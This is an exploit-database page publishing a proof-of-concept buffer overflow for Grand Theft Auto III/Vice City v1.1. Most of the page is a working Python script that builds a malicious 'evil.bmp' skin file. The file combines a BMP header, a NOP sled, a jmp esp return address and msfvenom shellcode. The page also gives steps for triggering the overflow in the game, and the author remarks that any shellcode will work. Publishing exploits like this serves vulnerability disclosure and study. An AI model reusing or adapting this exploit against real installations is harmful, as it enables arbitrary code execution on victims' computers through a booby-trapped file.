---
title: Grand Theft Auto III Vice City Skin File 1.1 Buffer Overflow
url: https://cxsecurity.com/issue/WLB-2023040013
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-04
fetch_date: 2025-10-04T11:29:47.486027
---

# Grand Theft Auto III Vice City Skin File 1.1 Buffer Overflow

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Grand Theft Auto III Vice City Skin File 1.1 Buffer Overflow** **2023.04.03**  Credit:  **[Knursoft](https://cxsecurity.com/author/Knursoft/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-119](https://cxsecurity.com/cwe/CWE-119 "Click to see CWE-119")** | |

# Exploit Title: Grand Theft Auto III/Vice City Skin File v1.1 - Buffer Overflow
# Exploit Date: 22.01.2023
# Discovered and Written by: Knursoft
# Vendor Homepage: https://www.rockstargames.com/
# Version: v1.1
# Tested on: Windows XP SP2/SP3, 7, 10 21H2
# CVE : N/A
#1 - Run this python script to generate "evil.bmp" file.
#2 - Copy it to [Your Game Path]\skins.
#3 - Launch the game and navigate to Options > Player Setup and choose skin
"evil".
#4 - Buffer Overflow occurs and calc.exe pops up!
#msfvenom -p windows/exec CMD="calc.exe"
buf = b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
buf += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
buf += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
buf += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
buf += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
buf += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
buf += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
buf += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
buf += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
buf += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
buf += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
buf += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00"
buf += b"\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
buf += b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
buf += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
buf += b"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65"
buf += b"\x00"
#any shellcode should work, as it seems there is no badchars
ver = 0 #set to 1 if you want it to work on GTA III steam version
esp = b"\xb9\xc5\x14\x21" #mss32.dll jmp esp
bmphdr =
b"\x42\x4D\x36\x00\x03\x00\x00\x00\x00\x00\x36\x00\x00\x00\x28\x00"
#generic bmp header
payload = bmphdr
payload += b"\x90" \* 1026
if ver == 1:
payload += b"\x90" \* 112
payload += esp
payload += b"\x90" \* 20 #padding
payload += buf
with open("evil.bmp", "wb") as poc:
poc.write(payload)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040013)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top